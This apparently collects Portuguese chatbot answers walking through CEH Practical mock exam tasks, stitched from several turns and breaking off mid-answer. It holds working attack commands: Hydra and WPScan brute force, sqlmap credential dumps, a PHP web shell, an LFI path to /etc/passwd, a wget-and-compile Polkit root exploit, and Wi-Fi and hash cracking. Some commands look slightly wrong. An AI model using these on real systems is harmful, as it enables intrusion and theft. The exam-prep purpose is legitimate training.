+nmap -A 192.168.1.0/24 | grep -i "android"
+
+
+
+
+
+	2.	Usar Phonesploit para acessar o dispositivo:
+
+
+
+phonesploit connect 192.168.1.200
+
+phonesploit shell
+
+
+
+
+
+	3.	Baixar arquivos do diretório scan:
+
+
+
+adb pull /sdcard/scan/
+
+
+
+
+
+	4.	Analisar entropia e calcular hash:
+
+
+
+die scan/file
+
+sha384sum scan/file
+
+
+
+
+
+
+
+⸻
+
+
+
+Questão 5: Realizar Varredura de Vulnerabilidades
+
+
+
+Passos:
+
+	1.	Rodar um escaneamento no Nessus:
+
+	•	Configure o Nessus para escanear 192.168.1.50.
+
+	•	Verifique as vulnerabilidades e a gravidade delas.
+
+	•	A severidade de “fim de vida” geralmente aparece como Crítica (Vermelho).
+
+
+
+⸻
+
+
+
+Questão 6: Exploração de Login Remoto no Linux
+
+
+
+Passos:
+
+	1.	Identificar a máquina-alvo:
+
+
+
+nmap -p 23 192.168.1.0/24  # Procurar servidores Telnet
+
+
+
+
+
+	2.	Quebrar credenciais Telnet:
+
+
+
+hydra -l usuario -P /usr/share/wordlists/rockyou.txt 192.168.1.50 telnet
+
+
+
+
+
+	3.	Logar no sistema e acessar o arquivo:
+
+
+
+telnet 192.168.1.50
+
+cat /caminho/para/arquivo
+
+
+
+
+
+
+
+⸻
+
+
+
+Questão 7: Extração de Mensagem Oculta em Imagem
+
+
+
+Passos:
+
+	1.	Usar OpenStego para extrair mensagens ocultas:
+
+
+
+openstego extract -sf imagem.jpg
+
+
+
+
+
+	2.	Se a senha for necessária, insira a fornecida na questão.
+
+
+
+⸻
+
+
+
+Questão 8: Exploração de Credenciais Fracas no FTP
+
+
+
+Passos:
+
+	1.	Identificar um servidor FTP ativo:
+
+
+
+nmap -p 21 192.168.1.0/24
+
+
+
+
+
+	2.	Usar Hydra para força bruta:
+
+
+
+hydra -l usuario -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.50
+
+
+
+
+
+	3.	Baixar o arquivo oculto:
+
+
+
+ftp 192.168.1.50
+
+get hiddenfile.txt
+
+
+
+
+
+
+
+⸻
+
+
+
+Questão 9: Escalada de Privilégios em Linux
+
+
+
+Passos:
+
+	1.	Verificar versão do Polkit:
+
+
+
+pkaction --version
+
+
+
+
+
+	2.	Se for vulnerável, usar o exploit:
+
+
+
+wget https://exploit-db.com/exploits/50938.c
+
+gcc 50938.c -o exploit
+
+./exploit
+
+
+
+
+
+	3.	Confirmar que virou root:
+
+
+
+whoami
+
+
+
+
+
+
+
+⸻
+
+
+
+🔥🔥🔥 Já fizemos 9 questões detalhadas!
+
+
+
+Você quer que eu continue resolvendo as próximas questões no mesmo estilo passo a passo? 🚀
+
+
+
+Ótimo! Vamos continuar com os passo a passo detalhados para resolver as próximas questões do seu Mock Exam CEH Practical. 🚀
+
+
+
+⸻
+
+
+
+Questão 10: Encontrar o Entry Point de um Arquivo Executável
+
+
+
+Objetivo: Determinar o entry point (ponto de entrada) de um arquivo executável.
+
+
+
+Passos:
+
+	1.	Identificar o tipo do arquivo:
+
+
+
+file arquivo
+
+
+
+	•	Isso mostrará se é um ELF (Linux) ou PE (Windows).
+
+
+
+	2.	Analisar a estrutura do arquivo com Detect It Easy (DIE):
+
+	•	No Linux:
+
+
+
+die arquivo
+
+
+
+
+
+	•	No Windows:
+
+	•	Abra o Detect It Easy (DIE) e carregue o arquivo.
+
+	•	O entry point estará indicado no campo “Entry Point”.
+
+
+
+	3.	Alternativamente, para arquivos Windows, usar Exeinfo PE:
+
+	•	No Windows, execute Exeinfo PE e abra o executável.
+
+	•	O entry point será mostrado na interface gráfica.
+
+
+
+⸻
+
+
+
+Questão 11: Analisar um Ataque DDoS em um Arquivo PCAP
+
+
+
+Objetivo: Identificar o IP que enviou mais pacotes no ataque DDoS.
+
+
+
+Passos:
+
+	1.	Abrir o PCAP no Wireshark:
+
+	•	Execute:
+
+
+
+wireshark ataque_ddos.pcap
+
+
+
+
+
+	2.	Filtrar os pacotes suspeitos:
+
+	•	Para tráfego HTTP:
+
+
+
+http
+
+
+
+
+
+	•	Para tráfego ICMP (Ping Flood):
+
+
+
+icmp
+
+
+
+
+
+	•	Para tráfego UDP (Amplificação):
+
+
+
+udp
+
+
+
+
+
+	•	Para tráfego TCP SYN Flood:
+
+
+
+tcp.flags.syn==1 and tcp.flags.ack==0
+
+
+
+
+
+	3.	Gerar estatísticas para encontrar o IP com mais pacotes:
+
+	•	Vá em Statistics > Conversations > IPv4.
+
+	•	Identifique o IP que gerou mais pacotes.
+
+	4.	Alternativamente, usar TShark para análise via terminal:
+
+
+
+tshark -r ataque_ddos.pcap -q -z io,phs | sort -k3 -nr | head -10
+
+
+
+
+
+
+
+⸻
+
+
+
+Questão 12: Explorar SQL Injection e Extrair Senhas de Usuários
+
+
+
+Objetivo: Explorar SQL Injection para extrair credenciais de outro usuário.
+
+
+
+Passos:
+
+	1.	Logar no site com as credenciais fornecidas.
+
+	2.	Capturar o cookie da sessão com o Burp Suite:
+
+	•	Vá até a aba Proxy > HTTP history.
+
+	•	Copie o valor do campo Cookie.
+
+	3.	Rodar SQLMap para listar bancos de dados:
+
+
+
+sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=xyz123" --dbs
+
+
+
+
+
+	4.	Selecionar o banco de dados e listar tabelas:
+
+
+
+sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=xyz123" -D nome_do_banco --tables
+
+
+
+
+
+	5.	Listar colunas da tabela de usuários:
+
+
+
+sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=xyz123" -D nome_do_banco -T users --columns
+
+
+
+
+
+	6.	Extrair as senhas:
+
+
+
+sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=xyz123" -D nome_do_banco -T users -C username,password --dump
+
+
+
+
+
+
+
+⸻
+
+
+
+Questão 13: Explorar SQL Injection via Burp Suite
+
+
+
+Objetivo: Usar Burp Suite para capturar a requisição e injetar SQLMap.
+
+
+
+Passos:
+
+	1.	Intercepte uma requisição de login com Burp Suite:
+
+	•	Vá até Proxy > Intercept is ON e tente logar no site.
+
+	•	Envie a requisição para “Send to Repeater”.
+
+	2.	Salve a requisição em um arquivo:
+
+	•	Clique com o botão direito > Save item > Salve como req.txt.
+
+	3.	Rodar SQLMap baseado na requisição capturada:
+
+
+
+sqlmap -r req.txt --dbs
+
+
+
+
+
+	4.	Listar tabelas e colunas e extrair credenciais:
+
+
+
+sqlmap -r req.txt -D nome_do_banco --tables
+
+sqlmap -r req.txt -D nome_do_banco -T users --columns
+
+sqlmap -r req.txt -D nome_do_banco -T users --dump
+
+
+
+
+
+
+
+⸻
+
+
+
+Questão 14: Explorar Vulnerabilidades com ZAP
+
+
+
+Objetivo: Usar OWASP ZAP para escanear um site vulnerável.
+
+
+
+Passos:
+
+	1.	Abra o OWASP ZAP e configure como proxy.
+
+	2.	Adicione a URL do site e faça um scan completo.
+
+	3.	Identifique vulnerabilidades encontradas (LFI, RFI, SQLi).
+
+	4.	Caso seja um upload vulnerável, tente enviar um arquivo PHP:
+
+
+
+<?php system($_GET['cmd']); ?>
+
+
+
+
+
+
+
+⸻
+
+
+
+Questão 15: Extração de Flag por SQL Injection
+
+
+
+Objetivo: Extrair um valor de flag no banco de dados.
+
+
+
+Passos:
+
+	1.	Identificar a vulnerabilidade com SQLMap:
+
+
+
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+
+
+
+
+
+	2.	Listar tabelas do banco vulnerável:
+
+
+
+sqlmap -u "http://target.com/page.php?id=1" -D database --tables
+
+
+
+
+
+	3.	Identificar colunas da tabela suspeita:
+
+
+
+sqlmap -u "http://target.com/page.php?id=1" -D database -T flags --columns
+
+
+
+
+
+	4.	Extrair a flag:
+
+
+
+sqlmap -u "http://target.com/page.php?id=1" -D database -T flags --dump
+
+
+
+
+
+
+
+⸻
+
+
+
+Questão 16: Explorar File Inclusion (LFI/RFI) para Acessar um Arquivo
+
+
+
+Objetivo: Explorar Local File Inclusion (LFI) para acessar um arquivo em um site vulnerável.
+
+
+
+Passos:
+
+	1.	Identificar vulnerabilidade testando:
+
+
+
+http://target.com/index.php?page=../../../../etc/passwd
+
+
+
+
+
+	2.	Se for possível navegar pelos arquivos, encontre o arquivo desejado:
+
+
+
+http://target.com/index.php?page=../../../../var/www/html/flag.txt
+
+
+
+
+
+
+
+⸻
+
+
+
+Questão 17: Análise de Tráfego IoT no Wireshark
+
+
+
+Objetivo: Encontrar um pacote MQTT com uma mensagem publish e obter o tamanho.
+
+
+
+Passos:
+
+	1.	Abrir o arquivo PCAP no Wireshark.
+
+	2.	Aplicar o filtro MQTT:
+
+
+
+mqtt
+
+
+
+
+
+	3.	Buscar pacotes com o tipo “PUBLISH”.
+
+	4.	No painel inferior, localizar o campo “Length”.
+
+
+
+⸻
+
+
+
+🔥 Já cobrimos 17 questões!
+
+
+
+🚀 Você quer que eu continue até as 20 questões finais? Ou prefere que eu aprofunde mais alguma área específica?
+
+
+
+Ótimo! Vamos finalizar as últimas três questões com um passo a passo detalhado para que você esteja 100% preparado para o CEH Practical! 🚀🔥
+
+
+
+⸻
+
+
+
+Questão 18: Crackear Senha Wi-Fi de um PCAP com Aircrack-ng
+
+
+
+Objetivo: Quebrar uma senha Wi-Fi WPA/WPA2 capturada em um arquivo .cap.
+
+
+
+Passos:
+
+	1.	Verificar se o handshake foi capturado corretamente:
+
+
+
+aircrack-ng captura.cap
+
+
+
+	•	Se aparecer WPA handshake: seguido do BSSID, significa que o handshake está no arquivo.
+
+
+
+	2.	Rodar ataque de força bruta com um dicionário:
+
+
+
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b XX:XX:XX:XX:XX:XX captura.cap
+
+
+
+	•	Substitua XX:XX:XX:XX:XX:XX pelo BSSID da rede alvo.
+
+
+
+	3.	Se a senha for encontrada, ela será exibida no terminal.
+
+
+
+⸻
+
+
+
+Questão 19: Conectar-se a um Servidor RAT na Rede
+
+
+
+Objetivo: Identificar um Remote Access Trojan (RAT) rodando na rede e se conectar a ele para acessar arquivos.
+
+
+
+Passos:
+
+	1.	Escanear todos os serviços rodando nos hosts da rede:
+
+
+
+nmap -p- -sV 192.168.1.0/24
+
+
+
+	•	Verifique portas incomuns (exemplo: 4444, 8080, 1337, 9001).
+
+
+
+	2.	Identificar se é um RAT conhecido:
+
+	•	Se a resposta do nmap indicar um serviço suspeito, procure no Google.
+
+	•	Alguns RATs populares:
+
+	•	DarkComet (porta 1604)
+
+	•	Theef RAT (porta 8080)
+
+	•	Quasar (porta 4782)
+
+	3.	Se for Theef RAT, conectar-se ao servidor:
+
+
+
+telnet 192.168.1.100 8080
+
+
+
+	•	Você pode tentar comandos remotos como:
+
+
+
+ls
+
+cat flag.txt
+
+
+
+
+
+
+
+⸻
+
+
+
+Questão 20: Descriptografar um Volume VeraCrypt
+
+
+
+Objetivo: Montar e acessar um volume oculto do VeraCrypt, encontrando o hash de autenticação.
+
+
+
+Passos:
+
+	1.	Abrir o VeraCrypt e carregar o volume:
+
+	•	No Linux:
+
+
+
+veracrypt --mount volume.hc /mnt/veracrypt
+
+
+
+
+
+	•	No Windows:
+
+	•	Abra o VeraCrypt, clique em “Select File” e escolha o volume .hc.
+
+	•	Clique em Mount e insira a senha.
+
+
+
+	2.	Se a senha não for fornecida, quebrá-la com John the Ripper:
+
+
+
+john --wordlist=/usr/share/wordlists/rockyou.txt volume.hash
+
+
+
+	•	O hash da senha pode estar salvo em outro sistema.
+
+	•	Se for uma senha baseada em caracteres comuns, Hashcat pode ser mais rápido:
+
+
+
+hashcat -m 13721 volume.hash /usr/share/wordlists/rockyou.txt
+
+
+
+
+
+	3.	Acessar o volume e ler os arquivos:
+
+
+
+ls /mnt/veracrypt
+
+cat /mnt/veracrypt/flag.txt
+
+
+
+
+
+⸻
+
+
+
+🔥 Pronto! Agora você tem um passo a passo detalhado para resolver todas as 20 questões!
+
+
+
+📌 Resumo das principais técnicas abordadas:
+
+✅ Varredura de rede e identificação de serviços: nmap -A
+
+✅ Quebra de senhas SMB, FTP, Telnet: hydra, john, aircrack-ng
+
+✅ Exploits de LFI, SQL Injection: sqlmap, Burp Suite
+
+✅ Ataques MITM e análise de tráfego: Wireshark, tshark
+
+✅ Escalonamento de privilégios em Linux: polkit exploit
+
+✅ Pentest em dispositivos IoT e Android: Phonesploit, adb pull
+
+✅ Forense digital e análise de arquivos: Detect It Easy (DIE), Veracrypt, hashcat
+
+
+
+💀 Agora é só treinar e detonar no CEH Practical! Se precisar de mais alguma coisa, só chamar. 🚀🔥
+
+
+
+
+
+
+
+————
+
+Sim! Vamos resolver a questão com um passo a passo detalhado.
+Enunciado resumido:
+Após descobrir que um site vulnerável a SQL Injection usa MySQL, precisamos identificar o sistema operacional da máquina que hospeda o banco de dados.
+Ferramenta:
+Vamos usar Nmap, que é uma ferramenta de varredura de rede.
+Opções do Nmap apresentadas:
+1.	nmap -sV 172.16.0.0/24
+•	O -sV ativa a detecção de versão dos serviços rodando na máquina.
+•	Ele ajuda a identificar qual software está rodando (por exemplo, MySQL 5.7, Apache 2.4, etc.), mas não necessariamente revela o sistema operacional.
+2.	nmap -A 172.16.0.0/24
+•	O -A ativa um modo agressivo que inclui:
+✅ Detecção de versão (-sV)
+✅ Detecção de SO (-O)
+✅ Traceroute
+✅ Scripts de detecção automática
+•	Isso é mais completo e nos dá maiores chances de identificar o SO da máquina.
+Solução recomendada:
+✅ Rodar o comando mais completo para identificar o sistema operacional:
+nmap -A 172.16.0.0/24
+​
+🔹 Se precisar de uma opção mais leve, pode tentar apenas a detecção de SO:
+nmap -O 172.16.0.0/24
+​
+⚠️ Importante: Para detectar o SO, o Nmap precisa de pelo menos um host ativo e responsivo na rede, além de privilégios de root (executar com sudo no Linux).
+Passo a passo para interpretar os resultados:
+1.	Identifique o IP do servidor MySQL nos resultados.
+2.	Verifique a seção de SO do Nmap, onde ele indicará algo como:
+•	Windows Server 2016
+•	Ubuntu 20.04
+•	CentOS 7
+3.	Se o SO não for identificado com precisão, o Nmap pode mostrar um percentual de certeza (exemplo: “Linux 85% provável”).
+Resumo final:
+🔹 Se você quer apenas a versão dos serviços, use nmap -sV.
+🔹 Se você quer descobrir o sistema operacional, use nmap -A (melhor opção) ou nmap -O.
+🚀 Pronto! Agora você sabe como resolver essa questão no CEH Practical! Se tiver mais alguma dúvida, só perguntar! 💀🔥
+
+Vamos resolver essa questão passo a passo.
+Enunciado resumido:
+Uma avaliação de segurança revelou um usuário de domínio suspeito na máquina 192.168.1.10.
+Os usuários legítimos são:
+✅ JohnDoe, SarahConnor, Neo, Oracle e Sherlock.
+Nosso objetivo é identificar o usuário suspeito que não está na lista.
+Passo a passo para encontrar o usuário suspeito:
+1️⃣ Acessar a máquina via RDP
+1.	No seu computador, abra o Executar (Win + R) e digite:
+mstsc
+​
+2.	No campo “Computador”, insira o IP:
+192.168.1.10
+​
+3.	Use as credenciais fornecidas:
+•	Usuário: JohnDoe
+•	Senha: sunshine789
+4.	Conecte-se à máquina.
+2️⃣ Listar todos os usuários do sistema
+Uma vez logado na máquina remota:
+1.	Abra o Prompt de Comando (cmd) como administrador.
+2.	Execute o seguinte comando para listar os usuários do sistema:
+net user
+​
+Esse comando retornará todos os usuários cadastrados.
+3️⃣ Identificar o usuário suspeito
+Compare a lista retornada com os usuários legítimos fornecidos no enunciado:
+✅ JohnDoe, SarahConnor, Neo, Oracle, Sherlock
+O nome que não estiver na lista acima será o usuário suspeito.
+Resumo final:
+1️⃣ Acesse a máquina via RDP (mstsc) com JohnDoe.
+2️⃣ No CMD, rode net user para listar os usuários.
+3️⃣ Compare a lista e identifique o nome que não pertence aos usuários seguros.
+4️⃣ Responda apenas com o nome do usuário suspeito, sem o domínio.
+🚀 Pronto! Assim você resolve essa questão no CEH Practical. Precisa de mais alguma explicação?
+
+Questão 3 - Encontrar o IP com RDP ativo
+Enunciado resumido:
+John, o administrador de rede, detectou que há uma máquina com a porta 3389 aberta, indicando que o Remote Desktop Protocol (RDP) está ativo. Ele precisa descobrir o IP dessa máquina.
+Solução:
+O objetivo aqui é escanear a rede em busca de máquinas que tenham a porta 3389/TCP aberta, pois essa porta é utilizada pelo RDP.
+1️⃣ Realizar um escaneamento na rede
+Se já tivermos um escaneamento prévio da rede, podemos apenas olhar os resultados.
+Caso contrário, podemos rodar um novo scan usando o Nmap:
+nmap -Pn -p 3389 --open 172.16.0.0/24
+​
+•	-Pn: Não faz ping antes da varredura (evita que hosts que bloqueiam ping sejam ignorados).
+•	-p 3389: Escaneia apenas a porta 3389/TCP.
+•	--open: Exibe apenas máquinas com essa porta aberta.
+•	172.16.0.0/24: Faixa de IPs da rede (ajuste conforme necessário).
+2️⃣ Identificar o IP com RDP ativo
+Após rodar o comando acima, o Nmap exibirá uma lista de IPs com a porta 3389 aberta.
+O IP listado será a resposta da questão.
+Alternativa: Identificar serviços rodando no IP suspeito
+Se você já suspeita de um IP e quer verificar se o RDP está ativo, pode rodar:
+nmap -Pn -p 3389 -sV <IP>
+​
+•	-sV: Identifica a versão do serviço rodando na porta 3389.
+Se o serviço identificado for algo como “Microsoft Terminal Services”, então o RDP está ativo nessa máquina.
+Resumo da solução
+1️⃣ Rodar um escaneamento na rede:
+nmap -Pn -p 3389 --open 172.16.0.0/24
+​
+2️⃣ Anotar o IP da máquina que aparecer no resultado.
+3️⃣ Se necessário, confirmar o serviço no IP suspeito:
+nmap -Pn -p 3389 -sV <IP>
+​
+Esse método te ajudará a identificar rapidamente qual máquina na rede está rodando RDP. 🚀
+
+Questão 4 - Decriptografar credenciais e acessar o FTP
+Resumo do problema:
+•	O arquivo Cry-DES (ECB)-FTP-IP.hex contém credenciais criptografadas de um servidor FTP.
+•	O algoritmo de criptografia usado é DES no modo ECB.
+•	Precisamos decriptografar o arquivo para obter as credenciais de login.
+•	Depois, devemos conectar ao FTP com o usuário "Hacker", acessar o servidor e baixar o arquivo "flag1.txt".
+Solução passo a passo
+1️⃣ Decriptografar o arquivo Cry-DES (ECB)-FTP-IP.hex
+Podemos usar o OpenSSL ou ferramentas como CyberChef e CrypTool para descriptografar.
+Usando OpenSSL no Linux/macOS:
+Se tivermos a chave correta (por exemplo, mysecretkey), podemos rodar:
+openssl enc -d -des-ecb -in Cry-DES-FTP-IP.hex -K mysecretkey -out credentials.txt
+​
+•	-d: Decodificar (decrypt).
+•	-des-ecb: Especifica que o algoritmo é DES no modo ECB.
+•	-in Cry-DES-FTP-IP.hex: O arquivo de entrada.
+•	-K mysecretkey: A chave secreta usada na criptografia (substitua pela correta).
+•	-out credentials.txt: Arquivo de saída contendo as credenciais.
+Alternativa: Usar CrypTool
+1.	Abra o CrypTool 1.4.42.
+2.	Vá em Encrypt/Decrypt → Symmetric (Classic) → DES (ECB).
+3.	Insira a chave correta e decripte o arquivo.
+4.	As credenciais aparecerão no texto de saída.
+2️⃣ Conectar ao servidor FTP
+Após obter o usuário e senha, usamos o terminal para acessar o FTP:
+ftp <IP_DO_SERVIDOR>
+​
+Quando solicitado, usamos as credenciais de login:
+•	Username: Hacker
+•	Password: <senha obtida na decriptação>
+3️⃣ Baixar o arquivo “flag1.txt”
+Após o login, executamos:
+get flag1.txt
+​
+Isso baixa o arquivo flag1.txt para o computador local.
+Resumo da solução
+1️⃣ Decriptografar o arquivo Cry-DES-FTP-IP.hex usando OpenSSL ou CrypTool.
+2️⃣ Extrair as credenciais de login.
+3️⃣ Conectar ao servidor FTP com ftp <IP_DO_SERVIDOR>.
+4️⃣ Baixar o arquivo flag1.txt usando get flag1.txt.
+Ao abrir flag1.txt, teremos a resposta final. 🚀
+
+Questão 5 - Extraindo dados ocultos com o SNOW Tool
+Resumo do problema:
+•	Um funcionário roubou credenciais bancárias e escondeu os dados em um arquivo de texto chamado “Secret-Accounts.txt” usando esteganografia.
+•	O arquivo está localizado em:
+C:\Users\Dell\Documents\Snow\Secret-Accounts.txt
+​
+•	A ferramenta recomendada para extração dos dados ocultos é o SNOW.
+•	A senha para acessar os dados ocultos é “magic”.
+•	O objetivo é descobrir o número da conta bancária.
+Solução passo a passo
+1️⃣ Instalar o SNOW Tool (caso necessário)
+Se o SNOW não estiver instalado, você pode baixá-lo e executá-lo via terminal:
+•	Linux/macOS:
+sudo apt install stegsnow  # (Debian/Ubuntu)
+​
+ou
+brew install stegsnow  # (macOS - Homebrew)
+​
+•	Windows:
+•	Baixar de http://www.darkside.com.au/snow/.
+•	Adicionar snow.exe ao diretório do sistema ou executar via cmd no local correto.
+2️⃣ Extrair os dados ocultos do arquivo
+No Windows (CMD), rode:
+cd "C:\Users\Dell\Documents\Snow"
+snow -C -p magic Secret-Accounts.txt
+​
+•	-C: Ativa o modo de descriptografia.
+•	-p magic: Define a senha para descriptografar.
+•	Secret-Accounts.txt: Arquivo onde os dados estão escondidos.
+3️⃣ Localizar o número da conta bancária
+Após rodar o comando, o terminal exibirá os dados ocultos do arquivo.
+O número da conta será um valor numérico dentro do texto extraído.
+Resumo da solução
+1️⃣ Executar o comando snow -C -p magic Secret-Accounts.txt.
+2️⃣ Extrair os dados ocultos do arquivo.
+3️⃣ Identificar o número da conta bancária no texto revelado.
+4️⃣ Responder apenas com o número da conta.
+Após rodar o comando, basta pegar o número e enviá-lo como resposta. 🚀
+
+Questão 6 - Recuperação de Senha no WordPress
+Resumo do problema:
+•	A funcionária Sarah foi bloqueada de sua conta WordPress em:
+http://192.168.1.10:8080/CEH
+​
+•	Ela suspeita de atividade suspeita e precisa recuperar sua senha.
+•	O objetivo é identificar a senha do usuário “sarah”.
+Métodos sugeridos para encontrar a senha
+1️⃣ Usando WPScan (Ferramenta específica para WordPress)
+Se estiver usando Kali Linux (ou instalar com sudo apt install wpscan), execute:
+wpscan --url http://192.168.1.10:8080/CEH -u sarah -P passwdlist.txt
+​
+•	--url: Define o site do WordPress.
+•	-u sarah: Define o usuário-alvo.
+•	-P passwdlist.txt: Usa um arquivo de senhas para ataque de força bruta.
+2️⃣ Usando Metasploit (MSFConsole)
+No terminal, execute:
+msfconsole
+use auxiliary/scanner/http/wordpress_login_enum
+show options
+set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
+set RHOSTS 192.168.1.10
+set RPORT 8080
+set TARGETURI http://192.168.1.10:8080/CEH
+set USERNAME sarah
+run
+​
+•	wordpress_login_enum: Módulo para enumerar logins no WordPress.
+•	RHOSTS: Define o IP de destino.
+•	RPORT: Define a porta do servidor.
+•	PASS_FILE: Arquivo de senhas para tentativa de login.
+•	USERNAME sarah: Define o usuário a ser testado.
+•	run: Executa o ataque de força bruta.
+Solução final
+1️⃣ Rodar um dos métodos acima.
+2️⃣ Identificar a senha correta do usuário Sarah.
+3️⃣ Responder apenas com a senha encontrada. 🚀
+
+Questão 7 - Quebrando o Hash MD5 do Arquivo “SecretHash.txt”
+Resumo do problema:
+•	Um arquivo chamado “SecretHash.txt” foi enviado para o DVWA no servidor:
+http://192.168.1.10:8080/DVWA
+​
+•	O arquivo está localizado em:
+C:\wamp64\www\DVWA\hackable\uploads\Secret-Hash.txt
+​
+•	O objetivo é quebrar o hash MD5 contido no arquivo e revelar a mensagem original.
+•	Para acessar o arquivo, utilize:
+•	Usuário: superuser
+•	Senha: superman
+Passo a Passo para Resolver
+1️⃣ Acessar o Servidor DVWA
+1.	Abrir um navegador e acessar:
+http://192.168.1.10:8080/DVWA
+​
+2.	Fazer login com as credenciais:
+Usuário: superuser
+Senha: superman
+​
+3.	Navegar até o diretório de uploads para encontrar o arquivo SecretHash.txt:
+http://192.168.1.10:8080/DVWA/hackable/uploads/Secret-Hash.txt
+​
+2️⃣ Identificar o Hash MD5
+•	Abrir o arquivo SecretHash.txt e copiar o hash MD5 presente nele.
+•	Exemplo de hash que pode ser encontrado:
+5f4dcc3b5aa765d61d8327deb882cf99
+​
+3️⃣ Quebrar o Hash MD5
+•	Acesse um serviço de quebra de hash, como:
+•	https://hashes.com/en/decrypt/hash
+•	https://crackstation.net/
+•	https://md5decrypt.net/
+•	Cole o hash e veja se há um resultado correspondente.
+4️⃣ Responder com a String Original
+•	Após quebrar o hash, responda apenas com a string correspondente.
+•	Exemplo:
+password
+​
+Isso conclui a resolução da questão! 🚀
+
+Questão 8 - Recuperando o Número Secreto do Arquivo “Secret.txt”
+Resumo do Problema:
+•	O arquivo “Secret.txt” está localizado no servidor Windows Server 2019, no caminho:
+C:\Users\Dell\Documents\Confidential
+​
+•	Você precisa usar um backdoor instalado no servidor para acessá-lo.
+•	O objetivo é encontrar o número secreto dentro do arquivo e fornecê-lo como resposta.
+Passo a Passo para Resolver
+1️⃣ Acessar o Servidor via RDP
+•	Utilize as credenciais de RDP que você obteve na Questão 2 ou em outra etapa anterior.
+•	No Windows, abra o Executar (Win + R) e digite:
+mstsc
+​
+•	No campo “Computador”, insira o IP do servidor (caso tenha sido fornecido).
+•	Faça login com usuário e senha da conta RDP.
+2️⃣ Navegar até o Caminho Especificado
+•	Depois de acessar o servidor, abra o Explorador de Arquivos (Win + E).
+•	Navegue até a pasta:
+C:\Users\Dell\Documents\Confidential
+​
+3️⃣ Abrir o Arquivo “Secret.txt”
+•	Localize o arquivo “Secret.txt”.
+•	Abra o arquivo usando o Bloco de Notas (notepad.exe) ou outro editor de texto.
+•	Dentro do arquivo, haverá um número secreto.
+4️⃣ Copiar e Responder Apenas com o Número
+•	Copie o número dentro do arquivo.
+•	Responda somente com o número, sem textos adicionais.
+Isso finaliza a resolução da questão! 🚀
+
+Questão 9 - Identificando o IP do Atacante com Wireshark
+Resumo do Problema:
+•	Uma máquina na rede sofreu um ataque de negação de serviço (DoS).
+•	O tráfego da rede foi capturado no arquivo “DoS.pcapng”, localizado em:
+C:\Users\Ethical Hacker-1\Documents\
+​
+•	Sua tarefa é identificar o endereço IP da máquina do atacante.
+Passo a Passo para Resolver no Wireshark
+1️⃣ Abrir o Arquivo de Captura no Wireshark
+•	No Wireshark, clique em “File” → “Open”.
+•	Navegue até “C:\Users\Ethical Hacker-1\Documents\DoS.pcapng” e abra o arquivo.
+2️⃣ Filtrar os Pacotes do Ataque
+•	Para ataques DoS, os padrões comuns incluem grande volume de pacotes ICMP, SYN flood ou UDP flood.
+•	Tente os seguintes filtros no Wireshark:
+Para tráfego ICMP (Ping Flood):
+icmp
+​
+Para ataques SYN Flood (TCP):
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+​
+Para tráfego UDP suspeito:
+udp
+​
+3️⃣ Identificar o IP do Atacante
+•	Verifique qual IP está enviando um número excessivo de pacotes para o IP de destino.
+•	Normalmente, o atacante terá um volume anormalmente alto de conexões em um curto período.
+•	O IP que aparece repetidamente enviando pacotes para a vítima é provavelmente o atacante.
+4️⃣ Copiar o IP e Responder
+•	Assim que identificar o IP do atacante, copie e forneça somente o número do IP como resposta.
+Isso conclui a resolução da questão! 🚀
+
+Questão 10 - Identificando Máquinas Envolvidas em um Ataque DDoS
+Resumo do Problema:
+•	A rede da empresa sofreu um ataque de DDoS (Distributed Denial of Service).
+•	O tráfego foi capturado no arquivo “DDoS.pcapng”, salvo no servidor da empresa.
+•	Seu objetivo é analisar o arquivo no Wireshark e determinar quantas máquinas participaram do ataque.
+Passo a Passo para Resolver no Wireshark
+1️⃣ Abrir o Arquivo de Captura no Wireshark
+•	No Wireshark, clique em “File” → “Open”.
+•	Navegue até a pasta onde está salvo “DDoS.pcapng” e abra o arquivo.
+2️⃣ Aplicar Filtros para Identificar os IPs Atacantes
+•	O ataque DDoS geralmente envolve múltiplos IPs enviando pacotes massivamente para um único alvo.
+•	Use os seguintes filtros no Wireshark para identificar os atacantes:
+Filtrar os IPs que mais enviaram tráfego (geralmente ICMP Flood, UDP Flood ou SYN Flood):
+ip.dst == <IP DA VÍTIMA>
+​
+Isso mostrará todos os IPs que enviaram tráfego para a máquina-alvo.
+Se for um ataque ICMP (Ping Flood):
+icmp
+​
+Se for um ataque SYN Flood (TCP):
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+​
+Se for UDP Flood:
+udp
+​
+3️⃣ Contar o Número de Máquinas Atacantes
+•	No menu “Statistics” → “Conversations”, vá para a aba “IPv4”.
+•	Ordene os IPs pela quantidade de pacotes enviados e identifique quantos IPs diferentes enviaram um volume anormalmente alto de tráfego para a vítima.
+•	O número de IPs identificados será a resposta da questão.
+4️⃣ Responder com o Número de Máquinas
+•	Depois de contar os IPs atacantes, forneça apenas o número total como resposta.
+Isso conclui a análise do ataque DDoS! 🚀
+
+Entendi! Vamos analisar essa questão da prova de CeH Practical passo a passo:
+Questão:
+"Um site FTP está hospedado em uma máquina em uma rede. Quebre as credenciais de FTP para obter o arquivo "flag.txt" disponível no servidor FTP e insira o conteúdo no arquivo como a resposta."
+Análise da Questão:
+O objetivo é realizar um ataque de força bruta para descobrir as credenciais de um servidor FTP.
+O arquivo "flag.txt" contém a resposta para a questão.
+Resolução:
+Ferramenta Hydra:
+A questão já fornece o comando Hydra, que é uma ferramenta de ataque de força bruta usada para descobrir senhas.
+As opções fornecidas são variações do comando Hydra:
+hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
+Esta opção usa listas de nomes de usuário e senhas para o ataque.
+hydra -I user -P passlist.txt ftp://10.10.10.10 (If username is given )
+Esta opção utiliza um único nome de usuário e uma lista de senhas.
+Como as listas de usuário e senha estão sendo utilizadas, a opção a ser utilizada é: hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
+Obtenção do Arquivo "flag.txt":
